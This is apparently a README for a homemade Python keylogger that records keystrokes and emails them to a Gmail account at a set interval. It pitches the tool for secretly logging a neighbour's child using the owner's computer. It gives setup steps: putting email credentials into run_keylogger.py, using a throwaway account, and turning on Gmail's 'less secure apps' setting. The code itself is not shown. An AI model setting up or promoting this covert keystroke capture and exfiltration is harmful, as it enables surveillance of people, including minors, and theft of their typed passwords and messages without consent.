# Keylogger
self-made local keylogger

* This local keylogger will come in handy while annoying neighbor's child is playing with your computer. 
* In order to run it locally, you have to make slight changes.

* Just edit the run_keylogger.py file as shown below
    * > my_keylogger = keylogger.Keylogger(enter time interval, "email address", "password")
    * > my_keylogger = keylogger.Keylogger(120, "my_mail@gmail.com", "123qwe")

* I recommend creating a throwaway Gmail account for this purpose. It because you’ll have to adjust your Gmail account’s security settings to allow access from your Python code. [Allow less secure apps to ON.](https://myaccount.google.com/lesssecureapps)

Run the program
```
python run_keylogger.py
```
